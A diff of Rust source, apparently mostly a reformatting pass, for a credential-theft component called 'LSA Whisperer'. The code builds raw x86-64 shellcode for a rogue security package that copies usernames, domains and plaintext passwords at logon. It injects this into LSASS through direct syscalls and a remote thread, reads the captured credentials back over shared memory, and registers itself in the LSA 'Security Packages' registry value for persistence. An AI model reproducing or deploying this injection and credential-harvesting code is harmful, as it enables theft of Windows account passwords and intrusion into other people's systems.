+    blob.extend_from_slice(&[0x89, 0xC1]); // mov ecx, eax
+                                           // Read Buffer from UNICODE_STRING
+    blob.extend_from_slice(&[0x49, 0x8B, 0x64, 0x24, 0x08]); // mov r12, [r12+0x08]
+    blob.extend_from_slice(&[0x4D, 0x85, 0xE4]); // test r12, r12
+                                                 // Inner skip: 3+3+2 = 8 bytes → jz = 0x08
+    blob.extend_from_slice(&[0x74, 0x08]); // jz skip_username
+    blob.extend_from_slice(&[0x4C, 0x89, 0xE6]); // mov rsi, r12
+    blob.extend_from_slice(&[0x48, 0x89, 0xDF]); // mov rdi, rbx
+    blob.extend_from_slice(&[0xF3, 0xA4]); // rep movsb
+                                           // skip_username:
 
     // ── Copy DomainName (PUNICODE_STRING at r13+0x10) ─────────────
-    blob.extend_from_slice(&[0x4D, 0x8B, 0x65, 0x10]);       // mov r12, [r13+0x10]
-    blob.extend_from_slice(&[0x4D, 0x85, 0xE4]);             // test r12, r12
-    // Sequence after jz (to skip_domain):
-    //   movzx eax, word [r12+0x00]        6 bytes
-    //   test eax, eax                     2 bytes
-    //   jz +0x21                          2 bytes  (74 21)
-    //   cmp eax, 128                      5 bytes
-    //   jbe +5                            2 bytes
-    //   mov eax, 128                      5 bytes
-    //   mov ecx, eax                      2 bytes
-    //   mov r12, [r12+0x08]               5 bytes
-    //   test r12, r12                     3 bytes
-    //   jz +0x09                          2 bytes  (74 09)
-    //   mov rsi, r12                      3 bytes
-    //   lea rdi, [rbx+0x40]               4 bytes  (48 8D 7B 40)
-    //   rep movsb                         2 bytes
-    //   Total: 43 bytes → jz = 0x2B
-    blob.extend_from_slice(&[0x74, 0x2B]);                     // jz skip_domain (43 bytes)
-    // Read Length from UNICODE_STRING
-    blob.extend_from_slice(&[0x41, 0x0F, 0xB7, 0x44, 0x24,
-                             0x00]);                             // movzx eax, word [r12+0x00]
-    blob.extend_from_slice(&[0x85, 0xC0]);                     // test eax, eax
-    // Inner skip: cmp(5)+jbe(2)+mov(5)+mov(2)+mov(5)+test(3)+jz(2)+mov(3)+lea(4)+rep(2) = 33 → 0x21
-    blob.extend_from_slice(&[0x74, 0x21]);                     // jz skip_domain
+    blob.extend_from_slice(&[0x4D, 0x8B, 0x65, 0x10]); // mov r12, [r13+0x10]
+    blob.extend_from_slice(&[0x4D, 0x85, 0xE4]); // test r12, r12
+                                                 // Sequence after jz (to skip_domain):
+                                                 //   movzx eax, word [r12+0x00]        6 bytes
+                                                 //   test eax, eax                     2 bytes
+                                                 //   jz +0x21                          2 bytes  (74 21)
+                                                 //   cmp eax, 128                      5 bytes
+                                                 //   jbe +5                            2 bytes
+                                                 //   mov eax, 128                      5 bytes
+                                                 //   mov ecx, eax                      2 bytes
+                                                 //   mov r12, [r12+0x08]               5 bytes
+                                                 //   test r12, r12                     3 bytes
+                                                 //   jz +0x09                          2 bytes  (74 09)
+                                                 //   mov rsi, r12                      3 bytes
+                                                 //   lea rdi, [rbx+0x40]               4 bytes  (48 8D 7B 40)
+                                                 //   rep movsb                         2 bytes
+                                                 //   Total: 43 bytes → jz = 0x2B
+    blob.extend_from_slice(&[0x74, 0x2B]); // jz skip_domain (43 bytes)
+                                           // Read Length from UNICODE_STRING
+    blob.extend_from_slice(&[0x41, 0x0F, 0xB7, 0x44, 0x24, 0x00]); // movzx eax, word [r12+0x00]
+    blob.extend_from_slice(&[0x85, 0xC0]); // test eax, eax
+                                           // Inner skip: cmp(5)+jbe(2)+mov(5)+mov(2)+mov(5)+test(3)+jz(2)+mov(3)+lea(4)+rep(2) = 33 → 0x21
+    blob.extend_from_slice(&[0x74, 0x21]); // jz skip_domain
     blob.extend_from_slice(&[0x3D, 0x80, 0x00, 0x00, 0x00]); // cmp eax, 128
-    blob.extend_from_slice(&[0x76, 0x05]);                     // jbe +5
+    blob.extend_from_slice(&[0x76, 0x05]); // jbe +5
     blob.extend_from_slice(&[0xB8, 0x80, 0x00, 0x00, 0x00]); // mov eax, 128
-    blob.extend_from_slice(&[0x89, 0xC1]);                     // mov ecx, eax
-    // Read Buffer from UNICODE_STRING
-    blob.extend_from_slice(&[0x49, 0x8B, 0x64, 0x24,
-                             0x08]);                             // mov r12, [r12+0x08]
-    blob.extend_from_slice(&[0x4D, 0x85, 0xE4]);             // test r12, r12
-    // Inner skip: 3+4+2 = 9 bytes → jz = 0x09
-    blob.extend_from_slice(&[0x74, 0x09]);                     // jz skip_domain
-    blob.extend_from_slice(&[0x4C, 0x89, 0xE6]);             // mov rsi, r12
-    blob.extend_from_slice(&[0x48, 0x8D, 0x7B, 0x40]);       // lea rdi, [rbx+0x40] (domain at slot+64)
-    blob.extend_from_slice(&[0xF3, 0xA4]);                     // rep movsb
-    // skip_domain:
+    blob.extend_from_slice(&[0x89, 0xC1]); // mov ecx, eax
+                                           // Read Buffer from UNICODE_STRING
+    blob.extend_from_slice(&[0x49, 0x8B, 0x64, 0x24, 0x08]); // mov r12, [r12+0x08]
+    blob.extend_from_slice(&[0x4D, 0x85, 0xE4]); // test r12, r12
+                                                 // Inner skip: 3+4+2 = 9 bytes → jz = 0x09
+    blob.extend_from_slice(&[0x74, 0x09]); // jz skip_domain
+    blob.extend_from_slice(&[0x4C, 0x89, 0xE6]); // mov rsi, r12
+    blob.extend_from_slice(&[0x48, 0x8D, 0x7B, 0x40]); // lea rdi, [rbx+0x40] (domain at slot+64)
+    blob.extend_from_slice(&[0xF3, 0xA4]); // rep movsb
+                                           // skip_domain:
 
     // ── Copy Password (PUNICODE_STRING at r13+0x18) ───────────────
-    blob.extend_from_slice(&[0x4D, 0x8B, 0x65, 0x18]);       // mov r12, [r13+0x18]
-    blob.extend_from_slice(&[0x4D, 0x85, 0xE4]);             // test r12, r12
-    // Sequence after jz (to skip_password):
-    //   movzx eax, word [r12+0x00]        6 bytes
-    //   test eax, eax                     2 bytes
-    //   jz +0x24                          2 bytes
-    //   cmp eax, 256                      5 bytes
-    //   jbe +5                            2 bytes
-    //   mov eax, 256                      5 bytes
-    //   mov ecx, eax                      2 bytes
-    //   mov r12, [r12+0x08]               5 bytes
-    //   test r12, r12                     3 bytes
-    //   jz +0x0C                          2 bytes
-    //   mov rsi, r12                      3 bytes
-    //   lea rdi, [rbx+0x80]               7 bytes  (48 8D BB 80 00 00 00)
-    //   rep movsb                         2 bytes
-    //   Total: 46 bytes → jz = 0x2E
-    blob.extend_from_slice(&[0x74, 0x2E]);                     // jz skip_password (46 bytes)
-    // Read Length from UNICODE_STRING
-    blob.extend_from_slice(&[0x41, 0x0F, 0xB7, 0x44, 0x24,
-                             0x00]);                             // movzx eax, word [r12+0x00]
-    blob.extend_from_slice(&[0x85, 0xC0]);                     // test eax, eax
-    // Inner skip: cmp(5)+jbe(2)+mov(5)+mov(2)+mov(5)+test(3)+jz(2)+mov(3)+lea(7)+rep(2) = 36 → 0x24
-    blob.extend_from_slice(&[0x74, 0x24]);                     // jz skip_password
+    blob.extend_from_slice(&[0x4D, 0x8B, 0x65, 0x18]); // mov r12, [r13+0x18]
+    blob.extend_from_slice(&[0x4D, 0x85, 0xE4]); // test r12, r12
+                                                 // Sequence after jz (to skip_password):
+                                                 //   movzx eax, word [r12+0x00]        6 bytes
+                                                 //   test eax, eax                     2 bytes
+                                                 //   jz +0x24                          2 bytes
+                                                 //   cmp eax, 256                      5 bytes
+                                                 //   jbe +5                            2 bytes
+                                                 //   mov eax, 256                      5 bytes
+                                                 //   mov ecx, eax                      2 bytes
+                                                 //   mov r12, [r12+0x08]               5 bytes
+                                                 //   test r12, r12                     3 bytes
+                                                 //   jz +0x0C                          2 bytes
+                                                 //   mov rsi, r12                      3 bytes
+                                                 //   lea rdi, [rbx+0x80]               7 bytes  (48 8D BB 80 00 00 00)
+                                                 //   rep movsb                         2 bytes
+                                                 //   Total: 46 bytes → jz = 0x2E
+    blob.extend_from_slice(&[0x74, 0x2E]); // jz skip_password (46 bytes)
+                                           // Read Length from UNICODE_STRING
+    blob.extend_from_slice(&[0x41, 0x0F, 0xB7, 0x44, 0x24, 0x00]); // movzx eax, word [r12+0x00]
+    blob.extend_from_slice(&[0x85, 0xC0]); // test eax, eax
+                                           // Inner skip: cmp(5)+jbe(2)+mov(5)+mov(2)+mov(5)+test(3)+jz(2)+mov(3)+lea(7)+rep(2) = 36 → 0x24
+    blob.extend_from_slice(&[0x74, 0x24]); // jz skip_password
     blob.extend_from_slice(&[0x3D, 0x00, 0x01, 0x00, 0x00]); // cmp eax, 256
-    blob.extend_from_slice(&[0x76, 0x05]);                     // jbe +5
+    blob.extend_from_slice(&[0x76, 0x05]); // jbe +5
     blob.extend_from_slice(&[0xB8, 0x00, 0x01, 0x00, 0x00]); // mov eax, 256
-    blob.extend_from_slice(&[0x89, 0xC1]);                     // mov ecx, eax
-    // Read Buffer from UNICODE_STRING
-    blob.extend_from_slice(&[0x49, 0x8B, 0x64, 0x24,
-                             0x08]);                             // mov r12, [r12+0x08]
-    blob.extend_from_slice(&[0x4D, 0x85, 0xE4]);             // test r12, r12
-    // Inner skip: 3+7+2 = 12 bytes → jz = 0x0C
-    blob.extend_from_slice(&[0x74, 0x0C]);                     // jz skip_password
-    blob.extend_from_slice(&[0x4C, 0x89, 0xE6]);             // mov rsi, r12
-    blob.extend_from_slice(&[0x48, 0x8D, 0xBB,
-                             0x80, 0x00, 0x00, 0x00]);         // lea rdi, [rbx+0x80] (password at slot+128)
-    blob.extend_from_slice(&[0xF3, 0xA4]);                     // rep movsb
-    // skip_password:
+    blob.extend_from_slice(&[0x89, 0xC1]); // mov ecx, eax
+                                           // Read Buffer from UNICODE_STRING
+    blob.extend_from_slice(&[0x49, 0x8B, 0x64, 0x24, 0x08]); // mov r12, [r12+0x08]
+    blob.extend_from_slice(&[0x4D, 0x85, 0xE4]); // test r12, r12
+                                                 // Inner skip: 3+7+2 = 12 bytes → jz = 0x0C
+    blob.extend_from_slice(&[0x74, 0x0C]); // jz skip_password
+    blob.extend_from_slice(&[0x4C, 0x89, 0xE6]); // mov rsi, r12
+    blob.extend_from_slice(&[0x48, 0x8D, 0xBB, 0x80, 0x00, 0x00, 0x00]); // lea rdi, [rbx+0x80] (password at slot+128)
+    blob.extend_from_slice(&[0xF3, 0xA4]); // rep movsb
+                                           // skip_password:
 
     // ── Set flags = FLAG_PLAINTEXT (cred_type=0 already from zeroing) ──
-    blob.extend_from_slice(&[0xFF, 0x83, 0x04, 0x01,
-                             0x00, 0x00]);                     // inc dword [rbx+0x104]
+    blob.extend_from_slice(&[0xFF, 0x83, 0x04, 0x01, 0x00, 0x00]); // inc dword [rbx+0x104]
 
     // ── Memory barrier: ensure all CredSlot writes are visible before
     // the count update.  mfence provides a full barrier (both loads
@@ -681,7 +658,7 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
     // the agent-side reader in another process never observes the
     // count increment before the slot data is committed.
     // V3-05 fix: replaced sfence with mfence for correct ordering.
-    blob.extend_from_slice(&[0x0F, 0xAE, 0xF0]);             // mfence
+    blob.extend_from_slice(&[0x0F, 0xAE, 0xF0]); // mfence
 
     // ── Increment count (atomic) ──────────────────────────────────
     // V3-05 fix: we no longer update write_index here — lock xadd
@@ -691,18 +668,18 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
     // ── epilogue ──────────────────────────────────────────────────
     // No NtUnmapViewOfSection or NtClose — the mapping persists.
     let accept_epilogue = blob.len();
-    blob.extend_from_slice(&[0x31, 0xC0]);                     // xor eax, eax
-    blob.extend_from_slice(&[0x48, 0x81, 0xC4]);             // add rsp, 0x28
+    blob.extend_from_slice(&[0x31, 0xC0]); // xor eax, eax
+    blob.extend_from_slice(&[0x48, 0x81, 0xC4]); // add rsp, 0x28
     blob.extend_from_slice(&0x28u32.to_le_bytes());
-    blob.extend_from_slice(&[0x41, 0x5F]);                     // pop r15
-    blob.extend_from_slice(&[0x41, 0x5E]);                     // pop r14
-    blob.extend_from_slice(&[0x41, 0x5D]);                     // pop r13
-    blob.extend_from_slice(&[0x41, 0x5C]);                     // pop r12
-    blob.extend_from_slice(&[0x5F]);                         // pop rdi
-    blob.extend_from_slice(&[0x5E]);                         // pop rsi
-    blob.extend_from_slice(&[0x5B]);                         // pop rbx
-    blob.extend_from_slice(&[0x5D]);                         // pop rbp
-    blob.push(0xC3);                                         // ret
+    blob.extend_from_slice(&[0x41, 0x5F]); // pop r15
+    blob.extend_from_slice(&[0x41, 0x5E]); // pop r14
+    blob.extend_from_slice(&[0x41, 0x5D]); // pop r13
+    blob.extend_from_slice(&[0x41, 0x5C]); // pop r12
+    blob.extend_from_slice(&[0x5F]); // pop rdi
+    blob.extend_from_slice(&[0x5E]); // pop rsi
+    blob.extend_from_slice(&[0x5B]); // pop rbx
+    blob.extend_from_slice(&[0x5D]); // pop rbp
+    blob.push(0xC3); // ret
 
     // ── Patch near jumps in SpAcceptCredentials ───────────────────
     {
@@ -729,22 +706,24 @@ pub fn build_ssp_blob() -> Result<Vec<u8>> {
     // ── Function pointer table (0x600) ────────────────────────────
     // Pre-resolve ntdll exports.  On Windows 10+ ntdll is at the same
     // base address in every process, so these addresses are valid in LSASS.
-    let ntdll_base = unsafe {
-        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
-    }
+    let ntdll_base = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) }
         .ok_or_else(|| anyhow!("cannot resolve ntdll base address"))?;
 
     let resolve = |name: &[u8]| -> Result<usize> {
         let hash = pe_resolve::hash_str(name);
-        unsafe { pe_resolve::get_proc_address_by_hash(ntdll_base, hash) }
-            .ok_or_else(|| anyhow!("cannot resolve ntdll export '{}'", String::from_utf8_lossy(name)))
+        unsafe { pe_resolve::get_proc_address_by_hash(ntdll_base, hash) }.ok_or_else(|| {
+            anyhow!(
+                "cannot resolve ntdll export '{}'",
+                String::from_utf8_lossy(name)
+            )
+        })
     };
 
     let nt_create_section = resolve(b"NtCreateSection")?;
-    let nt_open_section  = resolve(b"NtOpenSection")?;
-    let nt_map_view      = resolve(b"NtMapViewOfSection")?;
-    let nt_unmap_view    = resolve(b"NtUnmapViewOfSection")?;
-    let nt_close         = resolve(b"NtClose")?;
+    let nt_open_section = resolve(b"NtOpenSection")?;
+    let nt_map_view = resolve(b"NtMapViewOfSection")?;
+    let nt_unmap_view = resolve(b"NtUnmapViewOfSection")?;
+    let nt_close = resolve(b"NtClose")?;
 
     blob.extend_from_slice(&nt_create_section.to_le_bytes());
     blob.extend_from_slice(&nt_open_section.to_le_bytes());
@@ -817,14 +796,12 @@ pub fn read_captured_credentials(
     let mut status: i32;
 
     // Resolve NtOpenSection from ntdll via pe_resolve.
-    let ntdll_base = unsafe {
-        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
-    }
+    let ntdll_base = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) }
         .ok_or_else(|| anyhow!("cannot resolve ntdll"))?;
 
     type FnNtOpenSection = unsafe extern "system" fn(
-        *mut usize,       // SectionHandle
-        u32,              // DesiredAccess (SECTION_MAP_READ | SECTION_MAP_WRITE)
+        *mut usize,            // SectionHandle
+        u32,                   // DesiredAccess (SECTION_MAP_READ | SECTION_MAP_WRITE)
         *mut std::ffi::c_void, // ObjectAttributes
     ) -> i32;
 
@@ -835,16 +812,16 @@ pub fn read_captured_credentials(
     };
 
     type FnNtMapViewOfSection = unsafe extern "system" fn(
-        usize,            // SectionHandle
-        usize,            // ProcessHandle (-1 = current)
+        usize,                      // SectionHandle
+        usize,                      // ProcessHandle (-1 = current)
         *mut *mut std::ffi::c_void, // BaseAddress
-        usize,            // ZeroBits
-        usize,            // CommitSize
-        *mut std::ffi::c_void, // SectionOffset (NULL)
-        *mut usize,       // ViewSize (0 = map entire section)
-        u32,              // InheritDisposition (1 = ViewShare)
-        u32,              // AllocationType (0)
-        u32,              // Win32Protect (PAGE_READWRITE)
+        usize,                      // ZeroBits
+        usize,                      // CommitSize
+        *mut std::ffi::c_void,      // SectionOffset (NULL)
+        *mut usize,                 // ViewSize (0 = map entire section)
+        u32,                        // InheritDisposition (1 = ViewShare)
+        u32,                        // AllocationType (0)
+        u32,                        // Win32Protect (PAGE_READWRITE)
     ) -> i32;
 
     let nt_map_view: FnNtMapViewOfSection = unsafe {
@@ -857,7 +834,7 @@ pub fn read_captured_credentials(
     };
 
     type FnNtUnmapViewOfSection = unsafe extern "system" fn(
-        usize,            // ProcessHandle
+        usize,                 // ProcessHandle
         *mut std::ffi::c_void, // BaseAddress
     ) -> i32;
 
@@ -948,16 +925,18 @@ pub fn read_captured_credentials(
     };
 
     // Close the section handle regardless of mapping result.
-    unsafe { nt_close(section_handle); }
+    unsafe {
+        nt_close(section_handle);
+    }
 
     if status < 0 || base_addr.is_null() {
-        return Err(anyhow!("NtMapViewOfSection for credential shared memory failed: {status:#x}"));
+        return Err(anyhow!(
+            "NtMapViewOfSection for credential shared memory failed: {status:#x}"
+        ));
     }
 
     // Read the header and ring buffer.
-    let shm_slice = unsafe {
-        std::slice::from_raw_parts(base_addr as *const u8, SHM_SIZE)
-    };
+    let shm_slice = unsafe { std::slice::from_raw_parts(base_addr as *const u8, SHM_SIZE) };
 
     // Acquire fence: ensures we see the most recent write_index / count
     // values written by the SSP in LSASS.  On x86-64 TSO this is largely
@@ -990,12 +969,9 @@ pub fn read_captured_credentials(
             let username = decode_utf16_field(&slot_data[0..64]);
             let domain = decode_utf16_field(&slot_data[64..128]);
             let password = decode_utf16_field(&slot_data[128..256]);
-            let cred_type_tag = u32::from_le_bytes(
-                slot_data[256..260].try_into().unwrap_or([0; 4]),
-            );
-            let _flags = u32::from_le_bytes(
-                slot_data[260..264].try_into().unwrap_or([0; 4]),
-            );
+            let cred_type_tag =
+                u32::from_le_bytes(slot_data[256..260].try_into().unwrap_or([0; 4]));
+            let _flags = u32::from_le_bytes(slot_data[260..264].try_into().unwrap_or([0; 4]));
 
             let cred_type_name = match cred_type_tag {
                 CRED_TYPE_MSV => "msv",
@@ -1032,7 +1008,9 @@ pub fn read_captured_credentials(
     }
 
     // Unmap the section.
-    unsafe { nt_unmap_view(-1isize as usize, base_addr); }
+    unsafe {
+        nt_unmap_view(-1isize as usize, base_addr);
+    }
 
     Ok(new_creds)
 }
@@ -1091,12 +1069,12 @@ pub fn open_lsass_process() -> Result<usize> {
     );
 
     if status < 0 || process_handle == 0 {
-        return Err(anyhow!("NtOpenProcess(LSASS PID={lsass_pid}) failed: {status:#x}"));
+        return Err(anyhow!(
+            "NtOpenProcess(LSASS PID={lsass_pid}) failed: {status:#x}"
+        ));
     }
 
-    log::info!(
-        "LSA Whisperer: opened LSASS process (PID={lsass_pid}, handle={process_handle:#x})"
-    );
+    log::info!("LSA Whisperer: opened LSASS process (PID={lsass_pid}, handle={process_handle:#x})");
 
     Ok(process_handle)
 }
@@ -1128,8 +1106,8 @@ fn find_lsass_pid() -> Result<u32> {
 ///
 /// Returns the allocated base address in LSASS and the LSASS process handle.
 pub fn inject_ssp_into_lsass(blob: &[u8]) -> Result<(usize, usize)> {
-    use crate::syscalls::get_syscall_id;
     use crate::nt_handle::NtHandle;
+    use crate::syscalls::get_syscall_id;
 
     let lsass_handle = open_lsass_process()?;
     let _guard = NtHandle::new(lsass_handle);
@@ -1157,10 +1135,16 @@ pub fn inject_ssp_into_lsass(blob: &[u8]) -> Result<(usize, usize)> {
     );
 
     if status < 0 {
-        return Err(anyhow!("NtAllocateVirtualMemory in LSASS failed: {status:#x}"));
+        return Err(anyhow!(
+            "NtAllocateVirtualMemory in LSASS failed: {status:#x}"
+        ));
     }
 
-    log::info!("LSA Whisperer: allocated {:#x} RW bytes in LSASS at {:#x}", blob.len(), base_addr);
+    log::info!(
+        "LSA Whisperer: allocated {:#x} RW bytes in LSASS at {:#x}",
+        blob.len(),
+        base_addr
+    );
 
     // Write the SSP blob into LSASS
     let write_target = get_syscall_id("NtWriteVirtualMemory")
@@ -1215,13 +1199,15 @@ pub fn inject_ssp_into_lsass(blob: &[u8]) -> Result<(usize, usize)> {
             _guard.raw() as u64,
             &mut protect_base as *mut usize as u64,
             &mut protect_size as *mut usize as u64,
-            0x20u64,                        // PAGE_EXECUTE_READ
+            0x20u64, // PAGE_EXECUTE_READ
             &mut old_protect as *mut u32 as u64,
         ],
     );
 
     if status < 0 {
-        log::warn!("LSA Whisperer: NtProtectVirtualMemory(RW→RX) failed: {status:#x}, proceeding with RW");
+        log::warn!(
+            "LSA Whisperer: NtProtectVirtualMemory(RW→RX) failed: {status:#x}, proceeding with RW"
+        );
         // Non-fatal: the code is still writable.  Continue — the SSP will
         // execute on an RW page if the protection change was denied.
     }
@@ -1231,18 +1217,14 @@ pub fn inject_ssp_into_lsass(blob: &[u8]) -> Result<(usize, usize)> {
         let _ = invoke_nt_syscall(
             flush_tgt.ssn,
             flush_tgt.gadget_addr,
-            &[
-                _guard.raw() as u64,
-                base_addr as u64,
-                region_size as u64,
-            ],
+            &[_guard.raw() as u64, base_addr as u64, region_size as u64],
         );
     }
 
     // Create a remote thread to execute the SSP initialization.
     // The thread starts at the SpInitialize entry point (offset 0x000).
-    let thread_target = get_syscall_id("NtCreateThreadEx")
-        .map_err(|e| anyhow!("NtCreateThreadEx SSN: {e}"))?;
+    let thread_target =
+        get_syscall_id("NtCreateThreadEx").map_err(|e| anyhow!("NtCreateThreadEx SSN: {e}"))?;
 
     let mut thread_handle: usize = 0;
 
@@ -1281,7 +1263,9 @@ pub fn inject_ssp_into_lsass(blob: &[u8]) -> Result<(usize, usize)> {
                 ],
             );
         }
-        return Err(anyhow!("NtCreateThreadEx for SSP init in LSASS failed: {status:#x}"));
+        return Err(anyhow!(
+            "NtCreateThreadEx for SSP init in LSASS failed: {status:#x}"
+        ));
     }
 
     // Close the thread handle.
@@ -1376,9 +1360,18 @@ pub fn register_ssp_package() -> Result<()> {
     const LSA_VALUE: &str = "Security Packages";
 
     // Open the LSA registry key.
-    let key_wide: Vec<u16> = OsStr::new(LSA_KEY).encode_wide().chain(std::iter::once(0)).collect();
-    let val_wide: Vec<u16> = OsStr::new(LSA_VALUE).encode_wide().chain(std::iter::once(0)).collect();
-    let pkg_wide: Vec<u16> = OsStr::new(SSP_PACKAGE_NAME).encode_wide().chain(std::iter::once(0)).collect();
+    let key_wide: Vec<u16> = OsStr::new(LSA_KEY)
+        .encode_wide()
+        .chain(std::iter::once(0))
+        .collect();
+    let val_wide: Vec<u16> = OsStr::new(LSA_VALUE)
+        .encode_wide()
+        .chain(std::iter::once(0))
+        .collect();
+    let pkg_wide: Vec<u16> = OsStr::new(SSP_PACKAGE_NAME)
+        .encode_wide()
+        .chain(std::iter::once(0))
+        .collect();
 
     let mut hkey: winapi::shared::minwindef::HKEY = std::ptr::null_mut();
     let err = unsafe {
@@ -1453,7 +1446,9 @@ pub fn register_ssp_package() -> Result<()> {
 
     if already_registered {
         log::info!("LSA Whisperer: SSP package '{SSP_PACKAGE_NAME}' already registered");
-        unsafe { winapi::um::winreg::RegCloseKey(hkey); }
+        unsafe {
+            winapi::um::winreg::RegCloseKey(hkey);
+        }
         return Ok(());
     }
 
@@ -1474,12 +1469,8 @@ pub fn register_ssp_package() -> Result<()> {
     }
     new_value.push(0); // final null terminator for REG_MULTI_SZ
 
-    let new_bytes = unsafe {
-        std::slice::from_raw_parts(
-            new_value.as_ptr() as *const u8,
-            new_value.len() * 2,
-        )
-    };
+    let new_bytes =
+        unsafe { std::slice::from_raw_parts(new_value.as_ptr() as *const u8, new_value.len() * 2) };
 
     let err = unsafe {
         winapi::um::winreg::RegSetValueExW(
@@ -1492,7 +1483,9 @@ pub fn register_ssp_package() -> Result<()> {
         )
     };
 
-    unsafe { winapi::um::winreg::RegCloseKey(hkey); }
+    unsafe {
+        winapi::um::winreg::RegCloseKey(hkey);
+    }
 
     if err as u32 != winapi::shared::winerror::ERROR_SUCCESS {
         return Err(anyhow!(
